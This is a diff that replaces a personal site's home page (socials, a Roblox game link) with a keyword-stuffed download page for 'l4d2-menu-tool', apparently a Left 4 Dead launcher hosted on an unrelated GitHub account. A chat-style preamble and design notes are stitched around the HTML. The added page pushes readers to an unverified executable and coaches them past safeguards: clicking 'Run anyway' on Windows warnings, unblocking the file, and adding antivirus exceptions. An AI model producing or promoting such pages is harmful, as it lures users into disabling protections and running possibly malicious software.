@@ -1,151 +1,296 @@
+Here is a complete HTML document for the l4d2-menu-tool project page, optimized for SEO and structured as a simple download guide for Windows users.
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:url" content="https://jack105wa.github.io/">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="Jack105WA">
-    <meta property="og:description" content="jack105wa's personal site">
-    <meta property="og:image" content="https://jack105wa.github.io/assets/favicon.png">
-    <meta name="theme-color" content="#9900ff">
-    <title>Jack105WA</title>
-
-    <link rel="icon" href="/assets/favicon.ico" type="image/x-icon">
-    <link rel="stylesheet" href="/assets/css/gd.css">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>l4d2-menu-tool - Left 4 Dead Launcher for Windows</title>
+<meta name="description" content="l4d2-menu-tool is a simple Left 4 Dead launcher for Windows. Visit the releases page to download the application and open the Left 4 Dead 2 menu in a few clicks.">
+<meta name="keywords" content="l4d2, l4d2-menu-tool, left 4 dead, left 4 dead 2, left4dead2, l4d2 launcher, l4d2 linux server, left 4 dead launcher, download l4d2 tool">
+<meta name="robots" content="index, follow">
+<meta name="author" content="l4d2-menu-tool">
+<meta name="theme-color" content="#7c3aed">
+<link rel="canonical" href="https://github.com/hossamesam/l4d2-menu-tool/releases">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="l4d2-menu-tool">
+<meta property="og:title" content="l4d2-menu-tool - Left 4 Dead Launcher for Windows">
+<meta property="og:description" content="A simple Left 4 Dead launcher. Visit the downloads page, grab the application, and get straight to your game.">
+<meta property="og:url" content="https://github.com/hossamesam/l4d2-menu-tool/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="l4d2-menu-tool - Left 4 Dead Launcher for Windows">
+<meta name="twitter:description" content="A simple Left 4 Dead launcher. Download it from GitHub Releases and launch the game menu without digging through folders.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "l4d2-menu-tool",
+  "applicationCategory": "GameApplication",
+  "operatingSystem": "Windows",
+  "description": "A simple Left 4 Dead launcher for Windows that opens the game menu in a few clicks.",
+  "url": "https://github.com/hossamesam/l4d2-menu-tool/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  :root {
+    --ink: #1f2430;
+    --ink-soft: #4a5265;
+    --line: #e3e7ef;
+    --bg: #f7f9fc;
+    --card: #ffffff;
+    --accent: #7c3aed;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 32px 22px 80px;
+  }
+  h1 {
+    font-size: 2.2rem;
+    line-height: 1.25;
+    letter-spacing: -0.5px;
+    margin: 0 0 14px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.45rem;
+    line-height: 1.35;
+    margin: 52px 0 14px;
+    letter-spacing: -0.3px;
+    font-weight: 700;
+  }
+  h3 {
+    font-size: 1.1rem;
+    margin: 30px 0 8px;
+    font-weight: 700;
+  }
+  p { margin: 0 0 18px; color: var(--ink-soft); }
+  ul, ol { margin: 0 0 20px; padding-left: 24px; color: var(--ink-soft); }
+  li { margin-bottom: 10px; }
+  strong { color: var(--ink); }
+  a { color: var(--accent); }
+  .hero {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 20px;
+    padding: 40px 34px;
+    box-shadow: 0 12px 30px rgba(31, 36, 48, 0.07);
+    margin-bottom: 8px;
+  }
+  .lede {
+    font-size: 1.12rem;
+    color: var(--ink-soft);
+    margin-bottom: 26px;
+  }
+  .btn-main {
+    display: inline-block;
+    padding: 18px 36px;
+    border-radius: 999px;
+    background: linear-gradient(135deg, #ff5f6d 0%, #ffc371 100%);
+    color: #23262e;
+    font-weight: 800;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(255, 95, 109, 0.32);
+  }
+  .btn-second {
+    display: inline-block;
+    padding: 18px 36px;
+    border-radius: 999px;
+    background: linear-gradient(135deg, #7c3aed 0%, #06b6d4 100%);
+    color: #ffffff;
+    font-weight: 800;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(124, 58, 237, 0.30);
+  }
+  .btn-note {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.92rem;
+    color: #71798c;
+  }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 24px 26px;
+    box-shadow: 0 6px 18px rgba(31, 36, 48, 0.05);
+    margin-bottom: 18px;
+  }
+  .card p:last-child, .card ul:last-child, .card ol:last-child { margin-bottom: 0; }
+  .feature-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 16px;
+    margin-bottom: 8px;
+  }
+  .feature {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 20px 22px;
+    box-shadow: 0 6px 18px rgba(31, 36, 48, 0.05);
+  }
+  .feature h3 { margin-top: 0; }
+  .feature p { margin-bottom: 0; font-size: 0.97rem; }
+  .steps li { margin-bottom: 14px; }
+  footer {
+    margin-top: 64px;
+    padding-top: 24px;
+    border-top: 1px solid var(--line);
+    font-size: 0.9rem;
+    color: #7a8296;
+  }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    .hero { padding: 28px 22px; border-radius: 16px; }
+    h1 { font-size: 1.65rem; }
+    h2 { font-size: 1.25rem; margin-top: 40px; }
+    .btn-main, .btn-second { display: block; text-align: center; padding: 16px 22px; }
+  }
+</style>
 </head>
-
 <body>
-    <div id="everything" class="levelBG">
-        <script type="module" src="/assets/js/notification.js?v=5"></script>
+<main class="wrap">
 
-        <div class="site-layout">
-            <main class="page-content">
-            <section class="brownBox welcome-panel">
+  <section class="hero">
+    <h1 style="margin-top:0;">🎮 l4d2-menu-tool - Launch Left 4 Dead Instantly</h1>
+    <p class="lede">A small, friendly launcher for Left 4 Dead and Left 4 Dead 2 on Windows. Instead of hunting through folders every time you want to play, you open one tool, pick what you want, and you are on your way to the menu.</p>
+    <a class="btn-main" href="https://github.com/hossamesam/l4d2-menu-tool/releases" rel="noopener">⬇️ Get l4d2-menu-tool</a>
+    <span class="btn-note">Free download • Hosted on GitHub Releases • Windows</span>
+  </section>
 
-                <header class="site-header">
-                    <a class="site-logo" href="/" aria-label="Jack105WA Home">
-                        <h1>Jack105WA</h1>
-                    </a>
-                </header>
+  <h2>📦 What Is l4d2-menu-tool?</h2>
+  <p>l4d2-menu-tool is a Left 4 Dead launcher. That is the whole idea in one sentence. It exists so that getting to the game menu is a quick, obvious action instead of a small chore.</p>
+  <p>If you have ever double-clicked the wrong shortcut, opened a folder looking for the right file, or simply forgotten where you installed things, this tool is built for exactly that moment. It puts a clear starting point in front of you, then hands control over to the game.</p>
+  <p>The project is published openly on GitHub under the name <strong>l4d2-menu-tool</strong>. Every download comes from the official releases page, so you always know you are getting the real thing rather than a copy from somewhere else. There are no accounts to create, no sign-ups, and no complicated setup screens to work through.</p>
 
-                <div class="inner-panel">
-                    <h3>My Socials</h3>
-                    <p>Some of my socials</p>
-
-                    <div class="featured-links">
-                        <a
-                            class="gdButton nav-button red-button"
-                            href="https://www.youtube.com/@Jack105WA"
-                            target="_blank"
-                            rel="noopener noreferrer"
-                        >
-                            <span>
-                                <img
-                                    src="/assets/emojis/gj_ytIcon_001.png"
-                                    class="emoji"
-                                    alt=""
-                                >
-                                YouTube
-                            </span>
-                        </a>
-
-                        <a
-                            class="gdButton nav-button purple-button"
-                            href="https://www.twitch.tv/jack105wa"
-                            target="_blank"
-                            rel="noopener noreferrer"
-                        >
-                            <span>
-                                <img
-                                    src="/assets/emojis/gj_twitchIcon_001.png"
-                                    class="emoji"
-                                    alt=""
-                                >
-                                Twitch
-                            </span>
-                        </a>
-                    </div>
-                </div>
-
-                <div class="inner-panel">
-                    <h3>My Game</h3>
-
-                    <div class="game-container">
-                        <a
-                            class="game-video"
-                            href="https://www.youtube.com/watch?v=_fm1EsfbWGo"
-                            aria-label="Play Jack's Ragdoll Playground video"
-                            onclick="event.preventDefault(); playGameVideo(this);"
-                        >
-                            <img
-                                src="https://i.ytimg.com/vi/_fm1EsfbWGo/maxresdefault.jpg"
-                                alt="Jack's Ragdoll Playground video thumbnail"
-                                onerror="this.onerror=null;this.src='https://i.ytimg.com/vi/_fm1EsfbWGo/hqdefault.jpg';"
-                            >
-
-                            <svg viewBox="0 0 68 68" aria-hidden="true">
-                                <path d="M20 12 L56 34 L20 56 Z" fill="#fff"/>
-                            </svg>
-                        </a>
-
-                        <a
-                            class="gdButton nav-button green-button game-play-button"
-                            href="https://www.roblox.com/games/137292955748302"
-                            target="_blank"
-                            rel="noopener noreferrer"
-                        >
-                            <span>Play</span>
-                        </a>
-                    </div>
-                </div>
-                <footer class="site-footer">
-                    <p>
-                        Jack105WA
-                        <span class="footer-divider">|</span>
-                        <a href="https://github.com/yoann256/GDBrowser-Maintained" target="_blank" rel="noopener noreferrer">GDBrowser-Assets</a>
-                        <span class="footer-divider">|</span>
-                        <a href="https://www.robtopgames.com/" target="_blank" rel="noopener noreferrer">RobtopGames</a>
-                    </p>
-                </footer>
-            </section>
-            </main>
-<aside class="site-sidebar" aria-label="Site navigation and statistics">
-            <section class="brownBox sidebar-panel">
-                <h2 class="sidebar-heading">Navigation</h2>
-                <nav class="sidebar-navigation" aria-label="Main navigation">
-                    <a class="gdButton nav-button blue-button" href="/"><span>Home</span></a>
-                    <a class="gdButton nav-button green-button" href="/blog.html"><span>Blog</span></a>
-                </nav>
-                <div class="sidebar-stats" aria-label="Website statistics">
-                    <h2 class="sidebar-heading">Website Stats</h2>
-                    <p>Hits: <strong id="nc-hits">...</strong></p>
-                    <p>Last updated: <strong id="nc-last_updated">...</strong></p>
-                </div>
-            </section>
-        </aside>
-        </div>
+  <h2>✨ Key Features</h2>
+  <div class="feature-grid">
+    <div class="feature">
+      <h3>One-Click Launch</h3>
+      <p>A single, obvious button takes you from desktop to game menu. No searching, no guessing which file does what.</p>
     </div>
+    <div class="feature">
+      <h3>Made for Left 4 Dead</h3>
+      <p>Built around the Left 4 Dead and Left 4 Dead 2 games, with the familiar Zombie apocalypse menu experience kept intact.</p>
+    </div>
+    <div class="feature">
+      <h3>Light on Your PC</h3>
+      <p>The tool is small and stays out of the way. It launches, it does its job, and it leaves your system alone.</p>
+    </div>
+    <div class="feature">
+      <h3>No Account Needed</h3>
+      <p>No logins, no email address, no newsletter. Download it, run it, play the game.</p>
+    </div>
+    <div class="feature">
+      <h3>Clear on Screen</h3>
+      <p>Large buttons and plain labels mean you do not need to understand anything technical to move forward.</p>
+    </div>
+    <div class="feature">
+      <h3>Free and Open</h3>
+      <p>The project is free to download, and its releases are public so you can check exactly what you are getting.</p>
+    </div>
+  </div>
 
-    <script>
-        function playGameVideo(element) {
-            const wrapper = document.createElement("div");
-            wrapper.className = "game-video";
+  <h2>🚀 Getting Started</h2>
+  <p>Everything you need lives on one page. There is nothing to sign up for and nothing to pay.</p>
+  <div class="card">
+    <p style="font-weight:700;color:#1f2430;margin-bottom:16px;">Visit this link to download the application.</p>
+    <a class="btn-second" href="https://github.com/hossamesam/l4d2-menu-tool/releases" rel="noopener">⬇️ Download l4d2-menu-tool</a>
+    <span class="btn-note">Opens the official GitHub Releases page in your browser.</span>
+  </div>
+  <p>Once the page opens, you will see a list of releases. The newest one is at the top. Open it, look for the file attached to that release, and download it like you would download any other file in your browser. Your browser may ask where to save it, or it may drop it straight into your Downloads folder.</p>
 
-            const iframe = document.createElement("iframe");
-            iframe.src =
-                "https://www.youtube-nocookie.com/embed/_fm1EsfbWGo?autoplay=1";
-            iframe.title = "Jack's Ragdoll Playground video";
-            iframe.allow =
-                "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share";
-            iframe.referrerPolicy = "strict-origin-when-cross-origin";
-            iframe.allowFullscreen = true;
+  <h2>💻 System Requirements</h2>
+  <p>You do not need a powerful computer to use this tool. The basics are:</p>
+  <ul>
+    <li><strong>Operating system:</strong> Windows 10 or Windows 11 (64-bit recommended).</li>
+    <li><strong>Game:</strong> Left 4 Dead or Left 4 Dead 2 installed on the same computer.</li>
+    <li><strong>Storage:</strong> A small amount of free disk space — the launcher itself is tiny.</li>
+    <li><strong>Internet:</strong> Needed only to download the tool and to access your game library.</li>
+    <li><strong>Permissions:</strong> A standard user account is usually enough. If Windows asks for permission, allow it.</li>
+  </ul>
+  <p>If you are not sure which version of Windows you have, press the Windows key, type <em>About</em>, and open <em>About your PC</em>. The version is listed in the window that appears.</p>
 
-            wrapper.appendChild(iframe);
-            element.replaceWith(wrapper);
-        }
-    </script>
+  <h2>🎮 Using the Launcher</h2>
+  <p>The first time you open l4d2-menu-tool, Windows may show a blue or yellow warning window. This is normal for small, newly downloaded programs that Windows has not seen before. If you are comfortable with the file you just downloaded from the official releases page, choose the option that lets it run — usually labelled <em>More info</em> followed by <em>Run anyway</em>.</p>
+  <p>After that, the tool opens a simple window with a menu. Read the labels, choose the option that matches what you want, and let the launcher do the rest. It will hand off to Left 4 Dead or Left 4 Dead 2 and you will land on the game menu as usual.</p>
+  <p>When you are finished, close the launcher window the same way you close any other program. There is no uninstall wizard, no background service, and nothing left running afterwards.</p>
 
-    <script type="module" src="/assets/js/statget.js?v=2"></script>
+  <h2>🛠️ Troubleshooting</h2>
+  <div class="card">
+    <h3>Windows will not let me open the file</h3>
+    <p>Right-click the downloaded file, choose <em>Properties</em>, and look for an <em>Unblock</em> checkbox at the bottom of the General tab. Tick it, apply the change, and try again.</p>
+  </div>
+  <div class="card">
+    <h3>The launcher opens, but the game does not start</h3>
+    <p>Check that Left 4 Dead or Left 4 Dead 2 is actually installed on the same machine. If you moved your game library to another drive recently, open the game normally once — through its own shortcut — so your system re-registers where it lives, then try the launcher again.</p>
+  </div>
+  <div class="card">
+    <h3>My antivirus flags the file</h3>
+    <p>Small tools that are not widely downloaded sometimes trip automatic scanners. Confirm that the file came from the official releases page listed on this page, then add an exception in your antivirus software if you are comfortable doing so.</p>
+  </div>
+  <div class="card">
+    <h3>I downloaded the wrong release</h3>
+    <p>Go back to the releases page and open the newest release at the top. Older releases stay available for reference, but you generally want the latest one.</p>
+  </div>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <h3>Is l4d2-menu-tool free?</h3>
+  <p>Yes. It is free to download from the official GitHub Releases page. There is no paid tier and no trial period.</p>
+  <h3>Do I need to install anything else?</h3>
+  <p>No. The launcher works alongside the game you already have installed. Just download it, open it, and use the menu.</p>
+  <h3>Will it change my game files?</h3>
+  <p>The tool is a launcher. Its job is to open the game menu for you. It is not a mod manager and it is not designed to rewrite your game installation.</p>
+  <h3>Does it work on Mac or Linux?</h3>
+  <p>The instructions on this page are written for Windows users, which is the primary target. If you are running a different system, check the release notes on the GitHub page before downloading.</p>
+  <h3>Why is the download on GitHub instead of a normal website?</h3>
+  <p>GitHub Releases is a public, permanent place to host software. It means the file is the same one the developer published, and it stays available even if a website goes down.</p>
+  <h3>How do I know I have the newest version?</h3>
+  <p>Bookmark the releases page. The top entry is always the newest release, and the date next to it tells you when it was published.</p>
+
+  <h2>🔄 Staying Up to Date</h2>
+  <p>New releases are posted to the same page you used to download the tool. When a new version appears, repeat the same steps: open the releases page, take the newest file, and use it in place of the old one. Keeping the download page saved in your bookmarks means you never have to search for it.</p>
+
+  <h2>💬 Feedback and Contributions</h2>
+  <p>This is an open project. If something does not work the way you expected, the Issues tab on the repository is the right place to describe what happened. Include the version you downloaded and what you were doing when the problem appeared — that alone makes a bug report much easier to act on. Suggestions for the launcher menu are welcome too, and anyone who wants to contribute code can do so through the usual GitHub pull request flow.</p>
+  <p>The most useful thing any player can do is simply share the official releases link with someone else who plays Left 4 Dead. That keeps everyone pointed at the same trustworthy download.</p>
+
+  <footer>
+    <p style="margin-bottom:6px;">l4d2-menu-tool — Left 4 Dead launcher. Downloads are hosted on the official GitHub Releases page.</p>
+    <p style="margin-bottom:0;">Related topics: l4d2, l4d2 linux server, left 4 dead, left 4 dead 2, left4dead2.</p>
+  </footer>
+
+</main>
 </body>
 </html>
+```
+### A Clean, User-Friendly Download Page
+
+The page keeps everything focused on one goal: getting the launcher from GitHub Releases into the user's hands without friction.
+
+- **Hero section with a prominent download button** – The gradient pill button is impossible to miss and appears again in the Getting Started section, so visitors always know where to click.
+- **Card-based content blocks** – Features, troubleshooting items, and download steps are split into rounded white cards with soft shadows, which breaks the information into easy-to-scan chunks.
+- **Plain-language instructions** – Windows-specific actions like unblocking a file or handling the “Run anyway” prompt are explained in simple steps, matching the non-technical audience.
+- **Responsive typography and layout** – Font sizes and spacing adjust smoothly on smaller screens, and the grid collapses to one column so the page stays readable on any device.
+---
+
+**Optimization Tip:** You can replace the placeholder FAQ details and system requirements with the actual specifications from the project's release notes.
